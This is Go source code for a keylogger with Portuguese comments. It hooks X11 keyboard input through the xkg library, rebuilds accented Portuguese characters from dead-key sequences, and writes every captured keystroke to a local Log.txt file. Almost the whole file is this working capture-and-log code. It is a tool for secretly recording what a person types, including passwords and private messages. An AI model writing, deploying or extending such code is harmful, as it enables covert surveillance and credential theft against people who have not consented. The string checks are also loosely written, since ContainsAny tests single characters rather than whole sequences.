package main


import "github.com/LuccaPrado/xkg"
import "io/ioutil"
import "strings" 
var armazenar, nova string

func main() {
    var keys = make(chan int, 100)
	
    go xkg.StartXGrabber(keys)
	
    for {
        keycode := <-keys

        if key, ok := xkg.KeyMap[keycode]; ok {
			
            armazenar += key
            nova = armazenar
			//teste de acentuação com ~
            if strings.ContainsAny(armazenar, "~a"){
				nova = strings.Replace(armazenar, "~a", "ã", -1)
				armazenar = nova
				}//substitui o ~a
			
			if strings.ContainsAny(armazenar, "~e"){
				nova = strings.Replace(armazenar, "~e", "ẽ", -1)
				armazenar = nova
				}//substitui o ~e
			
			if strings.ContainsAny(armazenar, "~i"){
				nova = strings.Replace(armazenar, "~i", "ĩ", -1)
				armazenar = nova
				}//substitui o ~i
				
			if strings.ContainsAny(armazenar, "~o"){
				nova = strings.Replace(armazenar, "~o", "õ", -1)
				armazenar = nova
				}//substitui o ~o
			
			if strings.ContainsAny(armazenar, "~u"){
				nova = strings.Replace(armazenar, "~u", "ũ", -1)
				armazenar = nova
				}//substitui o ~u
			
			//teste de acentuação com '
            if strings.ContainsAny(armazenar, "'a"){
				nova = strings.Replace(armazenar, "'a", "á", -1)
				armazenar = nova
				}//substitui o 'a
			
			if strings.ContainsAny(armazenar, "'e"){
				nova = strings.Replace(armazenar, "'e", "é", -1)
				armazenar = nova
				}//substitui o 'e
			
			if strings.ContainsAny(armazenar, "'i"){
				nova = strings.Replace(armazenar, "'i", "í", -1)
				armazenar = nova
				}//substitui o 'i
				
			if strings.ContainsAny(armazenar, "'o"){
				nova = strings.Replace(armazenar, "'o", "ó", -1)
				armazenar = nova
				}//substitui o 'o
			
			if strings.ContainsAny(armazenar, "'u"){
				nova = strings.Replace(armazenar, "'u", "ú", -1)
				armazenar = nova
				}//substitui o 'u
			
			//pegando o ^
			if strings.ContainsAny(armazenar, "<shift>~"){
				nova = strings.Replace(armazenar, "<shift>~", "^", -1)
				armazenar = nova
				}
			//acentuação com ^
			
			 if strings.ContainsAny(armazenar, "^a"){
				nova = strings.Replace(armazenar, "^a", "â", -1)
				armazenar = nova
				}//substitui o a
			
			if strings.ContainsAny(armazenar, "^e"){
				nova = strings.Replace(armazenar, "^e", "ê", -1)
				armazenar = nova
				}//substitui o e
			
			if strings.ContainsAny(armazenar, "^i"){
				nova = strings.Replace(armazenar, "^i", "î", -1)
				armazenar = nova
				}//substitui o i
				
			if strings.ContainsAny(armazenar, "^o"){
				nova = strings.Replace(armazenar, "^o", "ô", -1)
				armazenar = nova
				}//substitui o o
			
			if strings.ContainsAny(armazenar, "^u"){
				nova = strings.Replace(armazenar, "^u", "û", -1)
				armazenar = nova
				}//substitui o u
			
			//pegando o `
			if strings.ContainsAny(armazenar, "<shift>'"){
				nova = strings.Replace(armazenar, "<shift>'", "`", -1)
				armazenar = nova
				}
			//acentuação com `
			
			 if strings.ContainsAny(armazenar, "`a"){
				nova = strings.Replace(armazenar, "`a", "à", -1)
				armazenar = nova
				}//substitui o a
			
			if strings.ContainsAny(armazenar, "`e"){
				nova = strings.Replace(armazenar, "`e", "è", -1)
				armazenar = nova
				}//substitui o e
			
			if strings.ContainsAny(armazenar, "`i"){
				nova = strings.Replace(armazenar, "`i", "ì", -1)
				armazenar = nova
				}//substitui o i
				
			if strings.ContainsAny(armazenar, "`o"){
				nova = strings.Replace(armazenar, "`o", "ò", -1)
				armazenar = nova
				}//substitui o o
			
			if strings.ContainsAny(armazenar, "`u"){
				nova = strings.Replace(armazenar, "`u", "ù", -1)
				armazenar = nova
				}//substitui o u
			
			
			if strings.ContainsAny(armazenar, "<shift>]"){
				nova = strings.Replace(armazenar, "<shift>]", "}", -1)
				armazenar = nova
				}
			if strings.ContainsAny(armazenar, "<shift>["){
				nova = strings.Replace(armazenar, "<shift>[", "{", -1)
				armazenar = nova
				}
			
			/*if strings.ContainsAny(armazenar, "<shift>/"){
				nova = strings.Replace(armazenar, "<shift>/", "?", -1)
				armazenar = nova
				}*/
			if strings.ContainsAny(armazenar, "<shift>;"){
				nova = strings.Replace(armazenar, "<shift>;", ":", -1)
				armazenar = nova
				}
			if strings.ContainsAny(armazenar, "<shift>,"){
				nova = strings.Replace(armazenar, "<shift>,", "<", -1)
				armazenar = nova
				} 
			if strings.ContainsAny(armazenar, "<shift>."){
				nova = strings.Replace(armazenar, "<shift>.", ">", -1)
				armazenar = nova
				}
			
            ioutil.WriteFile("Log.txt", []byte(armazenar), 0777)
        }
       
    }
}

